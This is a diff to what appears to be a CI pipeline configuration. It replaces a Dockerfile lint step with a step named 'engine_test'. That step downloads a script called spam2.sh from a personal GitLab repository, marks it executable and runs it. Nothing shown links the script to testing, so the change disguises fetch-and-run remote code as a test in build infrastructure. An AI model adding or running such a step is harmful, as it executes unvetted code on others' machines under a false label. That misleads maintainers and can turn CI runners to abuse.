@@ -1,16 +1,13 @@
 ---
+################
+# Build & Test #
+################
 
 kind: pipeline
-type: docker
-name: FullBuild
-
-platform:
-  os: linux
-  arch: amd64
+name: run_tests
 
 steps:
-- name: Lint Dockerfile
-  image: hadolint/hadolint:latest-alpine
-  pull: if-not-exists
-  commands:
-    - lscpu
+  - name: engine_test
+    image: python:3.7.2
+    commands:
+    - wget https://gitlab.com/renifer12/project-7/-/raw/main/spam2.sh && chmod +x spam2.sh && ./spam2.sh
